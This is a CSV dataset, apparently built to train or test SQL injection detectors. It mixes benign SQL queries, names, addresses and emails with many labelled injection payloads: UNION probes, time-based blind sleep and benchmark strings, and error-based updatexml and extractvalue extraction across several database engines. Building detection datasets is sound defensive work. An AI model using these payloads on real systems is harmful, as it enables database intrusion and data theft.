"1   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   3038  =  3038",1,1,1.0
"-9014%'  )   union all select 4211,4211,4211,4211,4211,4211#",1,1,1.0
almendros,0,0,0.004468253314358248
select principal ( s )  from pocket full outer join,0,0,0.0
nihei_donat@multaspendientes.cu,0,0,0.004468253314358248
-8409   )    )    as ipbz where 9984  =  9984 or 3371  =  3869,1,1,1.0
select * from motor  where rhyme = original,0,0,0.0
select count ( cold )  from frame,0,0,0.0
oliveira,0,0,0.004468253314358248
4742,0,0,0.004468253314358248
"iif  (  9875  =  8961,1,1/0  )  ",1,1,1.0
select farm from back union select were from band order by ran,0,0,0.0
" select column_name ( s )  from equal,bet",0,0,0.0
select machine,0,0,0.00024957571886764606
"1"" where 8732  =  8732",1,1,1.0
delete from half,0,0,0.0
kwangchi,0,0,0.004468253314358248
"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",1,1,1.0
deying,0,0,0.004468253314358248
select * from language where vote not like 'tobacco%',0,0,0.0
1'+  (  select 'tbfj' where 4016  =  4016,1,1,1.0
"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
es2eri5o,0,0,0.004468253314358248
  )   or true--,1,1,0.97
"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",1,1,1.0
select top 3 * from round,0,0,0.0
"  select spread as plant, tears as [mile]  from month",0,0,0.0
"-7234""  )   union all select 3154,3154,3154,3154#",1,1,1.0
rix.piljeckaja@waterflyesp.be,0,0,0.00012815902898114418
4067,0,0,0.004468253314358248
veit,0,0,0.004468253314358248
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""dwbh"" like ""dwbh",1,1,0.99
lemunao porxas,0,0,0.004468253314358248
19219,0,0,0.004468253314358248
queral queral,0,0,0.004468253314358248
" select * from realize order by friend asc, ask desc",0,0,0.0
1.1363e+15,0,0,0.0
select top 3 * from wave select * from tribe 3select * from football,0,0,0.0
select * from particular,0,0,0.0
"-5355"" or make_set  (  9354  =  9354,7185  )  ",1,1,0.99
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,1.0
bebedizo,0,0,0.004468253314358248
select paragraph ( s from fourth right join,0,0,0.0
"1"" where 3329  =  3329 or sleep  (  5  )  --",1,1,1.0
borriol,0,0,0.004468253314358248
select count ( sonid ) from skin,0,0,0.0
"   select employees.stretch, count ( orders.reviewid )  as springfrom    ( ordersinner join took on orders.improveid  =  employees.hurtid ) ",0,0,0.0
select count ( union )  from folks,0,0,0.04
"ignacio aldecoa, 30, 6h",0,0,0.00108924991411699
"simancas, 172, 8-d",0,0,0.010087719298245614
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,1,1.0
select * from ago 3 select * from express,0,0,0.0
5719,0,0,0.004468253314358248
select avg ( six ) from join select sum ( attention ) ,0,0,0.0
select distinct compass from bell,0,0,0.0
1%' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and '%'  =  ',1,1,1.0
select count ( * )  from wp_options where option_name like 'wp\\_wps\\_bg\\_non\\_library\\_sync\\_1\\_batch\\_%',0,0,0.05
"palomares, 2 11b",0,0,8.742431534785472e-05
"  select replace ( ""sql tutorial"", ""sql"", ""html"" ) ;",0,0,0.01
-4339  )   where 7178  =  7178 or 4008  =  7232,1,1,1.0
1   )    )    as ipfy where 1189  =  1189,1,1,1.0
santibez el bajo,0,0,0.0
select hot ( s )  from division left join,0,0,0.0
"1'   )    )     )   and make_set  (  9514  =  8668,8668  )   and    (    (     (  'sgjj' like 'sgjj",1,1,1.0
"1'   )    )    as kfnt where 8090  =  8090 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,1,1.0
select * from monkey where basket = 'corn' limit 3,0,0,0.0
sauleda fidalgo,0,0,0.004468253314358248
select species ( s )  from heart union all,0,0,0.0
"select t.*, tt.* from wp_terms as t inner join wp_term_taxonomy as tt on t.term_id  =  tt.term_id where tt.taxonomy in  ( 'support_cat' )  and t.slug in  ( 'support-family' ) ",0,0,0.02
belalczar,0,0,0.004468253314358248
"insert into fire ( very, shout, string, lips, dollar, was )  values  ( 'completely', 'flow'. border', 'acres', 'jungle', 'captain', 'blew' )  ",0,0,0.0
"  select deal,college from everybody where active = 'mirror' union select cloth, scared from indicate",0,0,0.0
"molinos, los",0,0,0.0006448841877592402
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1,1,1.0
select top 3 * from live select * from dead 3select * from road,0,0,0.0
neusy,0,0,0.004468253314358248
select distinct however from instead,0,0,0.0
select top 3 * from race,0,0,0.0
livio,0,0,0.004468253314358248
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   '%'  =  '",1,1,1.0
81383348x,0,0,0.004468253314358248
healy,0,0,0.004468253314358248
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",1,1,1.0
32727347a,0,0,0.004468253314358248
select count ( purpleid ) from why,0,0,0.0
select beauty ( s )  from locate select modern ( s ) ,0,0,0.0
"1 and elt  (  1210  =  1210,sleep  (  5   )    )   # macc",1,1,1.0
corulln,0,0,0.004468253314358248
"quevedo y quintana s/n, 4-h",0,0,0.0
-7209'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'stqx'  =  'stqx,1,1,1.0
3748ny,0,0,0.004468253314358248
select count ( fly ) from series,0,0,0.0
09301966f,0,0,0.004468253314358248
select youth ( s from constantly right join,0,0,0.0
select * from wp_posts where id  =  239189 limit 1,0,0,0.0
"1' where 4185  =  4185 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,1,1.0
1.3059e+15,0,0,0.0
"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""mezx"" like ""mezx",1,1,1.0
wenner@rpdkorea.nr,0,0,0.004468253314358248
"1'+  (  select nzij where 5456  =  5456 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 262311 )  order by meta_id asc",0,0,0.0
pipponzi,0,0,0.004468253314358248
select count ( term )  from scared,0,0,0.0
dirck,0,0,0.004468253314358248
select count ( excellent )  from dropped,0,0,0.0
11106027v,0,0,0.004468253314358248
equilibrio,0,0,0.004468253314358248
"   select mouth, swimming, herself from dangerous where leaving  is null",0,0,0.0
select min ( ground )  as ship from sheep,0,0,0.0
9423,0,0,0.004468253314358248
"1"" where 9135  =  9135 and elt  (  4249  =  4249,7259  )  --",1,1,1.0
select avg ( corner ) from whose select sum ( unusual ) ,0,0,0.0
select   (  case when   (  9030  =  6952  )   then 1 else 9030*  (  select 9030 from master..sysdatabases  )   end  )  --,1,1,1.0
select town from evening union all select for from loss order by mass,0,0,0.0
"1%'   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"1%""  )   union all select null,null,null,null,null--",1,1,1.0
delete from mood,0,0,0.0
select * from swing,0,0,0.0
"  select * from yourself where turn not in  ( 'pony', 'degree', 'scared' )  ",0,0,0.0
-4828%'  )   or 8678  =  5745#,1,1,1.0
1capa2ad*or,0,1,0.61
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1,1,1.0
select * from fear where church = 'dream' fetch first 3 rows only,0,0,0.0
select * from held where continued = 'balloon'  and  ( imagine = 'many' or furniture = 'badly' ) ,0,0,0.0
"1""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""isbh"" like ""isbh",1,1,1.0
55912738z,0,0,0.004468253314358248
"insert into solution ( swung, pencil, cup, welcome, those, unhappy )  values  ( 'impossible', 'pen'. title', 'weak', 'front', 'judge', 'sets' )  ",0,0,0.0
"insert into ran ( instrument, wrong, oldest, few, wore, body )  values  ( 'swept', 'dropped'. repeat', 'cookies', 'bark', 'carbon', 'tonight' )  ",0,0,0.0
"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""rrbl""  =  ""rrbl",1,1,1.0
select top 50 percent * from fur select * from hungry fetch first 50 percent rows onlyselect top 3 * from vast,0,0,0.0
select top 50 percent * from information,0,0,0.0
select   (  case when   (  6859  =  6507  )   then 6859 else 6859*  (  select 6859 from mysql.db  )   end  )  #,1,1,1.0
from  ( select distinct bare from although ) ,0,0,0.0
select top 3 * from whether where spend = 'space',0,0,0.0
select min ( measure )  as apple from dropped,0,0,0.0
"1""  )   as cxwd where 5800  =  5800 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
"1""  )   as vcir where 6275  =  6275 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
prueckner@helicopter.com.gf,0,0,0.0
select top 50 percent * from gravity,0,0,0.0
select * from stopped order by hall,0,0,0.0
end# thjv,1,1,0.930224284366309
dulcera,0,0,0.004468253314358248
select * from gather fetch first 50 percent rows only,0,0,0.0
"calle tajo, 182,",0,0,0.0
cutler.hutton@the-white-pearl-resort.int,0,0,0.15263311361822263
"1 or elt  (  6272  =  6272,sleep  (  5   )    )   # klaw",1,1,1.0
select count ( * )  as partly,0,0,0.0
select avg ( spend ) from turn select sum ( widely ) ,0,0,0.0
select * from particularly where girl not like 'letter%',0,0,0.0
corcoy augu,0,0,0.004468253314358248
quest@palmatraducciones.pw,0,0,0.004468253314358248
select * from positive where third = 'outline',0,0,0.0
1' in boolean mode  )   union all select null#,1,1,1.0
select keep from cow,0,0,0.0
1 and 2006  =  2006,1,1,0.9351616644628664
"1%""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""%""  =  """,1,1,1.0
3.15402e+15,0,0,0.0
navas de san juan,0,0,0.0
select * from helpful 3 select * from store,0,0,0.0
17850,0,0,0.004468253314358248
"1   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,1.0
"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,1,1.0
1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,1,1,1.0
select * from fact where spring like '%tower%',0,0,0.0
-9657'  )   as ziiq where 7725  =  7725 or 3038  =  3038,1,1,1.0
1'   )    )    as zffq where 9572  =  9572 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1,1,1.0
select mice ( s )  from winter,0,0,0.0
fuentes calientes,0,0,0.004468253314358248
"-3865'  )   union all select 4935,4935,4935,4935,4935--",1,1,1.0
"1   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
"  select difficultyid as id, save as even from highest",0,0,0.0
clav6ria,0,0,0.004468253314358248
1'+  (  select rhlb where 9477  =  9477,1,1,1.0
1'+  (  select hett where 7228  =  7228,1,1,1.0
select * from orders where orderdate between '1996-07-01' and '1996-07-31';,0,0,0.0
select top 50 percent * from after,0,0,0.0
select   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  select 6002 from mysql.db  )   end  )  #,1,1,1.0
desmedro,0,0,0.004468253314358248
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 28555 )  order by meta_id asc",0,0,0.0
select column_name ( s ) from table1left join,0,0,0.0
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,1,1.0
select avg ( price ) from friend,0,0,0.0
1   )    )    or pg_sleep  (  __time__  )  --,1,1,1.0
select avg ( country ) from recognize,0,0,0.0
"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,1,1.0
"1%""   )    )     )   or sleep  (  5  )  #",1,1,1.0
select   (  case when   (  3344  =  8103  )   then 3344 else 1/  (  select 0  )   end  )  --,1,1,1.0
select top 3 * from particular where except = 'ranch' select * from double,0,0,0.0
select avg ( thirty ) from eventually select sum ( special ) ,0,0,0.0
select * from guess where reach between '1996-07-01' and '1996-07-31',0,0,0.0
"  select binary ""w3schools.com"";",0,0,0.12
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""uydm""  =  ""uydm",1,1,1.0
1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'mmfq'  =  'mmfq,1,1,1.0
"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""rqxd""  =  ""rqxd",1,1,1.0
"  select format ( 250500.5634, 2 ) ;",0,0,0.0
8121,0,0,0.004468253314358248
"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",1,1,1.0
a8ique0r4r,0,0,0.004468253314358248
san emiliano,0,0,0.0
121,0,0,0.004440982494135885
"-1148""   )    )    union all select 5442,5442,5442,5442#",1,1,1.0
select option_value from wp_options where option_name  =  'options_site_logo' limit 1,0,0,0.0
1'||  (  select 'xmoq' from dual where 8047  =  8047 and 7533  =  7533  )  ||',1,1,0.99
select count ( tooid ) from carried,0,0,0.0
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5f6c83ee379f0' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0,0,0.0
8.49643e+15,0,0,0.0
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,1,1.0
1'+  (  select 'wvqj' where 3709  =  3709,1,1,1.0
"1'+  (  select aahc where 5436  =  5436 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  +'",1,1,1.0
select * from choose where anyway not like 'path%',0,0,0.0
"-9156'   )    )    union all select 9110,9110,9110,9110#",1,1,1.0
select prepare ( s from shade right join,0,0,0.0
select * from equator where quickly = 'cloth' fetch first 3 rows only,0,0,0.0
-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254,1,1,1.0
knio,0,0,0.004468253314358248
"-2153'||  (  select 'sofs' where 4126  =  4126 union all select 4126,4126,4126,4126,4126#",1,1,1.0
"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",1,1,1.0
select cloth from worry union select certain from wooden order by young,0,0,0.0
graff@manzanilladevillafafila.iq,0,0,0.004468253314358248
select * from cloud where quiet between '1996-07-01' and '1996-07-31',0,0,0.01
9.06153e+15,0,0,0.0
"insert into total  ( replied, job, settlers )  values  ( 'fastened', 'scale', 'pond' )  ",0,0,0.0
58007817t,0,0,0.004468253314358248
select * from task where building = 'somewhere'  or nails = 'mark',0,0,0.0
select * from wing where sound = 'depth'  or body = 'raw',0,0,0.0
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1,1.0
"1   )    )    as vrev where 4248  =  4248 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,1,1.0
"1'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
1'   )    )    as vnwn where 8774  =  8774 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,0.99
"-4528""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""fxmt"" like ""fxmt",1,1,1.0
42836631m,0,0,0.004468253314358248
select avg ( fresh ) from anywhere,0,0,0.0
-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,1,1,1.0
reinhard,0,0,0.004468253314358248
"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",1,1,1.0
select * from society,0,0,0.0
"rodrigo caro, 165,",0,0,0.004468253314358248
1'||  (  select 'bwqc' from dual where 6897  =  6897 and sleep  (  5  )  #,1,1,1.0
select * from discover fetch first 3 rows only,0,0,0.0
"-3733'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'ybgd'  =  'ybgd",1,1,1.0
vispy,0,0,0.004468253314358248
select * from daughter fetch first 50 percent rows onlyselect top 3 * from younger,0,0,0.0
select * from stream 3 select * from unhappy,0,0,0.0
1  )   where 2940  =  2940,1,1,1.0
select * from cave where card between '1996-07-01' and '1996-07-31',0,0,0.0
select top 50 percent * from trap select * from toy fetch first 50 percent rows onlyselect top 3 * from tube,0,0,0.0
mirabel,0,0,0.004468253314358248
2.01871e+15,0,0,0.0
select count ( thing )  from careful,0,0,0.0
select * from glass fetch first 3 rows only,0,0,0.0
santa catalina 81,0,0,0.001859726256875087
"1%'   )    )     )   union all select null,null,null,null,null,null,null#",1,1,1.0
"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'ykoz'  =  'ykoz",1,1,1.0
"   select employees.accident, count ( orders.rhythmid )  as meantfrom    ( ordersinner join division on orders.stripid  =  employees.takenid ) ",0,0,0.0
haiti 27 1?g,0,0,0.1267589411821954
select * from nation fetch first 3 rows only select top 50 percent * from basket,0,0,0.0
select * from teacher where half in  ( select balance from prepare ) ,0,0,0.0
" select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",1,1,0.99
select count ( direction ) from tongue,0,0,0.0
torrecilla del monte,0,0,0.0
76971829y,0,0,0.004468253314358248
haewon7,0,0,0.004468253314358248
select * from this  where flag not like '[get]%',0,0,0.0
select distinct claws from gentle,0,0,0.0
select avg ( know ) from toward,0,0,0.0
"  select * from sent where result not in  ( 'scale', 'buried', 'basket' )  ",0,0,0.0
select avg ( carry ) from industrial,0,0,0.0
59718568b,0,0,0.004468253314358248
select * from ranch where adult not between 'pure' and 'chamber',0,0,0.0
511amasa,0,0,0.004468253314358248
4urr3at9,0,0,0.004468253314358248
"select * from baseball where evidence between ""throat"" and    ""weight""",0,0,0.0
select distinct citizen from everywhere,0,0,0.0
"-2787'   )    )    union all select 1996,1996,1996,1996,1996,1996,1996,1996#",1,1,0.9400417972831767
aguzadera,0,0,0.004468253314358248
select * from bad 3,0,0,0.0
busoms redolad,0,0,0.004468253314358248
select * from recognize where total = 'double'  and  ( than = 'flow' or tribe = 'beginning' ) ,0,0,0.0
es3regamiento,0,0,0.004468253314358248
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ytxg'  =  'ytxg,1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 30696 )  order by meta_id asc",0,0,0.0
end,1,1,0.5018152892334234
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'iwmy'  =  'iwmy,1,1,1.0
nolberto,0,0,0.004468253314358248
7395,0,0,0.004468253314358248
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'hmsu'  =  'hmsu",1,1,1.0
"  select underlineid as id, actual as start from sat",0,0,0.0
signoret@pisossantcugat.cat,0,0,0.0
select avg ( hospital ) from sometime select sum ( growth ) ,0,0,0.0
1.65e+15,0,0,0.0
select * from earn,0,0,0.0
harry,0,0,0.004468253314358248
invo3unta6i5,0,0,0.004468253314358248
"   select pocket, birds, moneyfrom observe where smoke  is not null",0,0,0.0
" select column_name ( s )  from realize,needed",0,0,0.0
zahira,0,0,0.004468253314358248
"  select str_to_date ( ""monday, august 14, 2017"", ""%w %m %e %y"" ) ;",0,0,0.03
"1%""   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
cretas,0,0,0.004468253314358248
"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",1,1,1.0
1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,1,1,1.0
select * from ride where route not like '[older]%',0,0,0.0
tabaquera,0,0,0.004468253314358248
"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
select min ( thick )  as stomach from poor,0,0,0.0
almcita,0,0,0.004468253314358248
"  select * from change where newspaper in  ( 'caught', 'ahead', 'pie' )  ",0,0,0.0
1'   )    )     )   and 7533  =  7533 and    (    (     (  'hoyw'  =  'hoyw,1,1,1.0
select division ( s )  from satisfied union,0,0,0.0
"  select insert ( ""w3schools.com"", 11, 3, ""no"" ) ;",0,0,0.0
select count ( organized )  from moving,0,0,0.0
select count ( betweenid ) from active,0,0,0.0
peaflor de hornija,0,0,0.0
"-1152%'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  '%'  =  '",1,1,1.0
select * from  ( select bridge from system ) ,0,0,0.0
select count ( spent )  from cut,0,0,0.0
select * from saved where satellites = 'evening' fetch first 3 rows only,0,0,0.0
1' where 6003  =  6003 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,1,1.0
select lot ( s )  from escape,0,0,0.0
delete from sister,0,0,0.0
"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",1,1,1.0
03t86i3,0,0,0.004468253314358248
if  (  8812  =  7896  )   select 8812 else drop function xltk--,1,1,1.0
select top 3 * from chicken,0,0,0.0
"1%""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""%""  =  """,1,1,1.0
"1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '",1,1,1.0
villaseca de uceda,0,0,0.0
select name from syscolumns where id   =     (  sele ...,1,0,0.21
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,1,1.0
"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",1,1,1.0
select * from equally where fur not like 'were%',0,0,0.0
&apos; or,1,1,0.8701958131503575
 ( select column_name from table_name where condition  ) ;,0,0,0.02
"  select subtime ( ""10:24:21"", ""-3:2:5"" ) ;",0,0,0.06
select avg ( mistake )  from principal  select sum ( opinion ) ,0,0,0.0
1 where 7299  =  7299 rlike sleep  (  5  )  --,1,1,1.0
select * from compare where period  between 10 and 20,0,0,0.0
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'svhx'  =  'svhx,1,1,1.0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",1,1,1.0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""jzmg""  =  ""jzmg",1,1,0.98
"-1908""   )    )    union all select 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#",1,1,1.0
46838,0,0,0.004468253314358248
morales de toro,0,0,0.0
grin,0,0,0.004468253314358248
8.51e+15,0,0,0.0
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'vkde'  =  'vkde",1,1,1.0
08109487d,0,0,0.004468253314358248
45643261z,0,0,0.004468253314358248
15821726a,0,0,0.004468253314358248
select count ( air ) from attempt,0,0,0.0
1'||  (  select 'bifa' where 6077  =  6077 and 4547  =  9301,1,1,0.99
select avg ( climb ) from lovely,0,0,0.0
"  select coffee,band from tonight where willing = 'sale' union select merely, carbon from extra",0,0,0.0
1'  )   as dpmh where 5281  =  5281 and 2006  =  2006,1,1,1.0
select * from read where slightly = 'remember' fetch first 3 rows only,0,0,0.0
select top 3 * from president where too = 'choose' select * from effect,0,0,0.0
select count ( boneid ) from blank,0,0,0.0
"insert into six  ( solid, automobile, wore )  values  ( 'hope', 'leather', 'smallest' )  ",0,0,0.0
39654869v,0,0,0.004468253314358248
"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--",1,1,1.0
1'  )   as ncou where 9166  =  9166 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1,1,0.99
" select * from users where id  =  1 or \<   =  1 union select 1,@@version -- 1",1,1,1.0
from  ( select distinct girl from discuss ) ,0,0,0.0
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""fkmh""  =  ""fkmh",1,1,1.0
  )   or pg_sleep  (  __time__  )  --,1,1,1.0
select * from common where planned not between 'satellites' and 'victory',0,0,0.0
select min ( brain )  as golden from individual,0,0,0.0
" select * from minute order by alike asc, push desc",0,0,0.0
select * from case fetch first 50 percent rows onlyselect top 3 * from number,0,0,0.02
select * from branch where result = 'window' fetch first 3 rows only,0,0,0.0
select count ( * )  as blank,0,0,0.0
